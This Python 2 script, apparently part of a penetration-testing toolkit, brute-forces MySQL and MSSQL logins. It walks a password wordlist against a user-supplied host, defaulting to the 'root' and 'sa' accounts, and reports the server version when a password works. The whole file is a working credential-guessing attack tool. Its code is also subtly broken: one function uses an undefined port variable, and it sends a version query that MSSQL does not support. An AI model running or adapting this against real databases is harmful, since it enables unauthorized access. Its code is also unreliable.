#!/usr/bin/python
#
# MySQL & MSSQL bruteforce
#
# Matt Jones - 04/07/2012
 
import time
from src.core.main import *
from src.core.menus import *
 
def mssql_brute(host,port,username,wordlist):
	try:
		with open(wordlist) as wl:
			count = 0
			PrintInfo("Starting bruteforce attack on %s:%s\n" % (host, port))
			for password in wl:
				count += 1
				password = password.rstrip()
				try:
					connect = pymssql.connect(host=host+ ":" + str(port), user=username, password=password)
					if connect:
						PrintInfo("SUCCESS: %s / %s" % (username,password))
						cursor = connect.cursor()
						cursor.execute("SELECT version()")
						result = cursor.fetchone()
						PrintInfo("Version info: %s" % result[0])
						break
				except:
					PrintFailed("FAILED: %s / %s" % (username, password))
					time.sleep(1)
                                                               
		PrintInfo("Tried %s passwords\n" % count)
	except KeyboardInterrupt:
		PrintError("Bruteforce Cancelled")
		 
def mysql_brute(host,username,wordlist):
	try:
		with open(wordlist) as wl:
			count =0
			PrintInfo("Starting bruteforce attack on %s:%s\n" % (host, port))
			for password in wl:
				count += 1
				password = password.rstrip()
				try:
					connect = MySQLdb.connect(host=host, user=username, passwd=password)
					if connect:
						PrintInfo("SUCCESS: %s / %s" % (username,password))
						cursor = connect.cursor()
						cursor.execute("SELECT version()")
						result = cursor.fetchone()
						PrintInfo("Version info: %s" % result[0])
						break
				except:
					PrintFailed("FAILED: %s / %s" % (username, password))
					time.sleep(1)
       
		PrintInfo("Tried %s passwords\n" % count)
	except KeyboardInterrupt:
		PrintError("Bruteforce Cancelled")
       
while 1:
	try:
		clear()
		
		try:
			import MySQLdb
			import pymssql
		except ImportError:
			print "Make sure MySQLdb and pymssql libraries are installed.\n(sudo apt-get install python-MySQLdb python-pymssql)"
			
			raw_input("\nPress %sENTER%s to continue" % (colours.bold, colours.reset))
			break
		
		# get some vairables
		selection = 0
		while selection != range(1,2):
			clear()
			sql_selection()
			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
			if selection == "1":
				dbtype = selection
				break
			if selection == "2":
				dbtype = selection
				break
		
		host = raw_input("\nEnter host ip: ")
		port = raw_input("Enter port: ")
		user = raw_input("Enter username: ")
		wordlist = raw_input("Enter path to wordlist (Enter for default): ")
		
		# set defaults for empty variables
		if not port:
			if dbtype == "1":
				port = "3306"
			elif dbtype == "2":
				port = "1433"
			
		if not user:
			if dbtype == "1":
				user = "root"
			elif dbtype == "2":
				user = "sa"
			
		if not wordlist:
			wordlist = default_wordlist()
			
		# start brute
		if dbtype == "1":
			mysql_brute(host,user,wordlist)
		elif dbtype == "2":
			mssql_brute(host,port,user,wordlist)
		
		EntContinue()
		break			
			
	except KeyboardInterrupt:
		break
